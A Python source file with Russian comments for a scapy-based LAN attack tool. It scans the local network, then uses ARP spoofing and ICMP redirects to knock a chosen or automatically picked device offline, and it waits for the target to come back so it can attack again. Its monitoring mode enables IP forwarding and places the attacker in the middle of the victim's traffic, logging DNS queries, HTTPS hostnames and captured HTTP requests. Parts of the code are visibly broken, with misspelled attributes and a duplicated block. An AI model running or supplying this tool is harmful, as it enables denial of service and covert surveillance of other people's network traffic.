import urllib

import scapy.all as scapy
import os
import socket
import sys
import time
import ctypes
from threading import Thread
from collections import Counter

from mac_vendor_lookup import MacLookup
from scapy.layers.dns import DNSQR
from scapy.layers.tls.all import TLS
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, sendp, sniff, send
from scapy.arch import get_if_addr
from scapy.all import conf
from scapy.layers.inet import ICMP, IP, TCP


class NetworkTool:
    def __init__(self):
        self.my_ip = get_if_addr(conf.iface)
        self.my_mac = conf.iface.mac
        self.router_ip = self._get_gateway_ip()
        self.router_mac = self._get_mac(self.router_ip)
        self.network_range = ".".join(self.my_ip.split(".")[:-1]) + ".0/24"
        self.is_attacking = False
        self.target_info = {"ip": None, "mac": None, "name": None, "packets": 0}
        self.found_devices = []
        self.query_log = []
        self.on_attack_log = None
        self.on_monitor_log = None

    def _get_gateway_ip(self):
        if os.name == 'nt':
            import subprocess
            result = subprocess.run(['route', 'print', '0.0.0.0'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if '0.0.0.0' in line and 'mask' not in line.lower():
                    parts = line.split()
                    if len(parts) >= 3 and parts[2] != "On-link": return parts[2]
        return "192.168.0.1"

    def _get_mac(self, ip):
        if not ip: return None
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, retry=2, verbose=0)[0]
        return ans[0][1].hwsrc if ans else None

    def _log_attack(self, msg):
        if self.on_attack_log: self.on_attack_log(msg)
        else: print(f"[ATTACK] {msg}")

    def _log_monitor(self, msg):
        if self.on_monitor_log: self.on_monitor_log(msg)
        else: print(f"[MONITOR] {msg}")

    def get_vendor_pro(self, mac):
        """Синхронный и надежный метод без конфликтов потоков"""
        # 1. Быстрый локальный кэш для самых частых (чтобы не спамить API)
        prefix = mac.lower()[:8]
        common = {
            "4c:a9:19": "Xiaomi", "54:6c:eb": "Samsung", "6a:35:9a": "Apple",
            "00:0c:29": "VMware", "b8:27:eb": "Raspberry"
        }
        if prefix in common:
            return common[prefix]

        # 2. Безопасный синхронный запрос к API
        try:
            url = f"https://api.macvendors.com/{mac}"
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=2) as response:
                return response.read().decode('utf-8')
        except:
            return "Unknown Device"


    def update_devices(self):
        ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.network_range), timeout=3, retry=2, verbose=0)[0]
        devs = []

        for _, r in ans:
            if r.psrc != self.my_ip and r.psrc != self.router_ip:
                try:
                    name = socket.gethostbyaddr(r.psrc)[0]
                except:
                    name = self.get_vendor_pro(r.hwsrc)

                if name == "Unknown device" and r.hwsrc[1].lower() in ['2', '6', 'a', 'e']:
                    name = "Private/Random MAC"

                devs.append({'ip': r.psrc, 'mac': r.hwsrc, 'name': name})
        self.found_devices = devs

    def find_noisy_guy(self, duration=7):
        counts = Counter()

        def count_packets(pkt):
            if pkt.haslayer(IP):
                src = pkt[IP].src
                if src not in [self.my_ip, self.router_ip]: counts[src] += 1

        sniff(prn=count_packets, timeout=duration)
        return counts.most_common(1)[0][0] if counts else None

    def attack_process(self):
        t_ip = self.target_info['ip']
        t_mac = self.target_info['mac']
        fake_mac = "00:00:00:00:00:00"  # Пакеты будут уходить в черную дыру

        # Цели говорим: Роутер по адресу fake_mac
        to_v = Ether(dst=t_mac) / ARP(op=2, pdst=t_ip, hwdst=t_mac, psrc=self.router_ip, hwsrc=fake_mac)
        # Роутеру говорим: Цель по адресу fake_mac
        to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, hwdst=self.router_mac, psrc=t_ip,
                                                hwsrc=fake_mac)
        broadcast_p = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, pdst=t_ip, psrc=self.router_ip)

        # 2. ICMP Redirect пакет (L3)
        # Говорим цели: "Для трафика во внешку (8.8.8.8) используй мой IP как шлюз"
        icmp_p = IP(src=self.router_ip, dst=t_ip) / ICMP(type=5, code=1, gw=self.my_ip) / IP(src=t_ip, dst='8.8.8.8')

        self._log_attack(f"[*] Атака запущена: ARP + ICMP Redirect на {t_ip}")

        while self.is_attacking:
            try:
                # Атакуем по ARP
                sendp(to_v, verbose=False)
                sendp(to_r, verbose=False)

                # Каждые 10 циклов усиливаем эффект
                if self.target_info['packets'] % 20 == 0:
                    sendp(broadcast_p, verbose=False)  # L2 удержание
                    send(icmp_p, verbose=False)  # L3 перенаправление

                self.target_info['packets'] += 2

                # Проверка на вылет из сети (Засада)
                if self.target_info['packets'] % 100 == 0:
                    check = srp(Ether(dst=t_mac) / ARP(pdst=t_ip), timeout=0.2, verbose=0)[0]
                    if not check:
                        self.on_monitor_log(f"\n[!] Цель {t_ip} пропала. Ухожу в ЗАСАДУ...")
                        self._wait_for_target()

                time.sleep(0.05)
            except Exception as e:
                continue

    def _wait_for_target(self):
        while self.is_attacking:
            ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.target_info['ip']), timeout=1, verbose=0)[0]
            if ans:
                self.target_info['mac'] = ans[0][1].hwsrc
                print(f"[+] Цель вернулась! Новый MAC: {self.target_info['mac']}")
                return
            time.sleep(1)

    def toggle_forwarding(self, state=True):
        """Включает/выключает пересылку пакетов в Windows"""
        val = 1 if state else 0
        os.system(
            f'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" /v IPEnableRouter /t REG_DWORD /d {val} /f')
        # Включаем через PowerShell для надежности
        ps_cmd = f'powershell "Get-NetIPInterface | Set-NetIPInterface -Forwarding {"Enabled" if state else "Disabled"}"'
        os.system(ps_cmd)

    def monitor_process(self):
        """Режим прослушки: Трафик течет сквозь меня"""
        t_ip = self.target_info['ip']
        t_mac = self.target_info['mac']

        self.toggle_forwarding(True)

        # Пакеты: hwsrc=self.my_mac (говорим всем слать трафик нам)
        to_v = Ether(dst=t_mac) / ARP(op=2, pdst=t_ip, psrc=self.router_ip, hwsrc=self.my_mac)
        to_r = Ether(dst=self.router_mac) / ARP(op=2, pdst=self.router_ip, psrc=t_ip, hwsrc=self.my_mac)

        self._log_monitor(f"[*] МОНИТОРИНГ: {t_ip} под наблюдением...")

        def packet_callback(pkt):
            if not self.is_attacking: return
            t_ip = self.target_info['ip']

            if pkt.haslayer(IP) and pkt[IP].src == t_ip:
                ttl = pkt[IP].ttl
                if 'os' not in self.target_info:
                    if ttl <= 64: self.target_info['os'] = "Linux/Android/iOS"
                    elif ttl <= 128: self.target_info['os'] = "Windows"
                    self.target_info['packets'] += 1
                    self._log_monitor(f"ℹ️ ОС цели определена как: {self.target_info['os']}")

                    # АНАЛИЗАТОР МОДЕЛИ (внутри packet_callback)
                    payload = str(pkt.getlayer(DNSQR)) if pkt.haslayer(DNSQR) else ""
                    detected_model = None

                    # 1. Ищем специфические домены
                    if "apple.com" in payload or "icloud.com" in payload:
                        detected_model = "Apple Device"
                    elif "android.clients.google.com" in payload or "play.googleapis.com" in payload:
                        detected_model = "Android Smartphone"
                    elif "windowsupdate.com" in payload or "msedge.net" in payload:
                        detected_model = "Windows PC"

                    # 2. Если нашли модель и еще не объявляли о ней
                    if detected_model and 'model_announced' not in self.target_info:
                        self.target_info['model'] = detected_model
                        self.target_info['model_announced'] = True

                        # Пишем в правый терминал
                        self._log_monitor(f"📱 ТИП УСТРОЙСТВА ОПРЕДЕЛЕН: {detected_model}")

                        # ОБНОВЛЯЕМ ИМЯ В ТАБЛИЦЕ!
                        for d in self.found_devices:
                            if d['ip'] == t_ip:
                                # Приписываем модель к текущему имени
                                d['name'] = f"[{detected_model}] {d['name'].replace('Unknown Device', '')}".strip()
                                break

            if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[TCP].dport == 443:
                if pkt.haslayer(TLS):
                    try:
                        # Поправлено: server_names и _log_monitor
                        server_name = pkt[TLS].msg[0].ext[0].server_names[0].hostname.decode()
                        if server_name not in self.query_log:
                            self.query_log.append(server_name)
                            self._log_monitor(f"🔒 HTTPS СОЕДИНЕНИЕ: {server_name}")
                    except:
                        pass

            if pkt.haslayer(DNSQR):
                query = pkt[DNSQR].qname.decode(errors='ignore').strip('.')

                # Список игнорируемого мусора
                trash = ['microsoft', 'google', 'gvt2', 'akamaized', 'live.com', 'bing']
                if any(t in query for t in trash): return

                # Показываем только если это новый запрос (не дубль)
                if query not in self.query_log:
                    self.query_log.append(query)
                    if len(self.query_log) > 20: self.query_log.pop(0)

                    # Печатаем красиво с меткой времени
                    t_str = time.strftime("%H:%M:%S")
                    self._log_monitor(f"[{t_str}] ЦЕЛЬ ПЕРЕШЛА: {query}")

            if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[TCP].dport == 443:
                if pkt.haslayer(TLS):
                    try:
                        server_name = pkt[TLS].msg[0].ext[0].servar_names[0].hostname.decode()
                        if server_name not in self.query_log:
                            self.query_log.append(server_name)
                            self._log_motinor(f"🔒 HTTPS СОЕДИНЕНИЕ: {server_name}")
                    except:
                        pass

            if pkt.haslayer(IP) and pkt[IP].src == t_ip:
                self.target_info['packets'] += 1
                if len(pkt) > 1000:
                    pass

            if pkt.haslayer(IP) and pkt.haslayer("Raw"):
                payload = pkt["Raw"].load.decode(errors='ignore')
                if "GET" in payload or "POST" in payload:
                    self._log_monitor(f"\n[!] ПЕРЕХВАЧЕН HTTP ЗАПРОС:\n{payload[:200]}")



        # Сниффер в отдельном потоке
        Thread(target=lambda: sniff(filter=f"host {t_ip} and udp port 53", prn=packet_callback, store=0),
               daemon=True).start()

        while self.is_attacking:
            sendp(to_v, verbose=False)
            sendp(to_r, verbose=False)
            time.sleep(1.5)  # Редкий спам, чтобы не мешать трафику

        self.toggle_forwarding(False)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def main():
    tool = NetworkTool()
    tool.update_devices()

    while True:
        clear_screen()
        print(f"--- [ NETWORK MONITOR v2.5 - HYBRID ] ---")
        print(f"MY IP: {tool.my_ip} | GW: {tool.router_ip} ({tool.router_mac})")
        print("-" * 55)
        if tool.is_attacking:
            print(f"● СТАТУС: АТАКА АКТИВНА | ЦЕЛЬ: {tool.target_info['ip']}")
            print(f"ОТПРАВЛЕНО ПАКЕТОВ: {tool.target_info['packets']}")
        else:
            print(f"○ СТАТУС: ОЖИДАНИЕ")
        print("-" * 55)
        print("ID | IP АДРЕС       | MAC АДРЕС         | ИМЯ")
        for i, d in enumerate(tool.found_devices):
            print(f"{i:2} | {d['ip'].ljust(14)} | {d['mac']} | {d['name']}")
        print("-" * 55)
        print("1. Сканировать | 2. Атака ID | 3. Мониторинг | 4. По шуму | 5. СТОП | 6. Выход")

        cmd = input(">> ")
        if cmd == '1':
            tool.update_devices()
        elif cmd == '2':
            try:
                idx = int(input("Введите ID: "))
                target = tool.found_devices[idx]
                tool.is_attacking = False
                time.sleep(0.2)
                tool.target_info.update(
                    {"ip": target['ip'], "mac": target['mac'], "name": target['name'], "packets": 0})
                tool.is_attacking = True
                Thread(target=tool.attack_process, daemon=True).start()
            except:
                pass
        elif cmd == '3':
            idx = int(input("Введите ID для МОНИТОРИНГА: "))
            target = tool.found_devices[idx]
            tool.is_attacking = True
            tool.target_info.update({"ip": target['ip'], "mac": target['mac'], "name": target['name'], "packets": 0})
            Thread(target=tool.monitor_process, daemon=True).start()
        elif cmd == '4':
            noisy_ip = tool.find_noisy_guy()
            if noisy_ip:
                mac = tool._get_mac(noisy_ip)
                if mac:
                    tool.is_attacking = False
                    time.sleep(0.2)
                    tool.target_info.update({"ip": noisy_ip, "mac": mac, "name": "Noisy Guy", "packets": 0})
                    tool.is_attacking = True
                    Thread(target=tool.attack_process, daemon=True).start()
        elif cmd == '5':
            tool.is_attacking = False
        elif cmd == '6':
            tool.is_attacking = False
            break


if __name__ == "__main__":
    if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
        sys.exit()
    main()